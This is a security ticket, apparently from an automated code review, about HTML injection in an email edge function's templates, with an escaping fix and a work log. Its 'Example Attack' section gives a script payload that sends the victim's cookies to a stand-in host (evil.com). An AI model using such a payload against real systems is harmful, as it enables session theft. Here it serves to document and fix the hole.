# XSS via HTML Injection in Email Edge Function

---
status: complete
priority: p1
issue_id: "029"
tags: [security, xss, edge-function]
dependencies: []
---

**Priority**: P1 (Critical)
**File**: `supabase/functions/send-email/index.ts:66-73`
**Source**: security-sentinel code review

## Issue

User-provided fields (`client_name`, `pickup_location`, `delivery_location`, `notes`) are directly interpolated into HTML email templates without escaping. An attacker can inject malicious scripts via service notes or location fields.

## Example Attack

```
notes: "<script>document.location='https://evil.com/?cookie='+document.cookie</script>"
```

## Fix

1. Escape all user-provided values before HTML interpolation
2. Use a template library with auto-escaping (e.g., handlebars with escapeExpression)
3. Or implement a simple HTML escape function:

```typescript
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
```

## Verification

After fix, test with `<script>alert(1)</script>` in notes field - should render as text, not execute.

## Acceptance Criteria

- [x] All user-provided fields are HTML-escaped before interpolation
- [x] XSS payload renders as plain text in email
- [x] Email formatting still looks correct

## Work Log

| Date | Action | Learnings |
|------|--------|-----------|
| 2026-01-24 | Identified by security-sentinel agent | User input in HTML templates must be escaped |
| 2026-01-24 | Approved during triage | Status changed to ready |
| 2026-01-24 | Implemented escapeHtml function | Escape all data at function entry point for cleaner code |
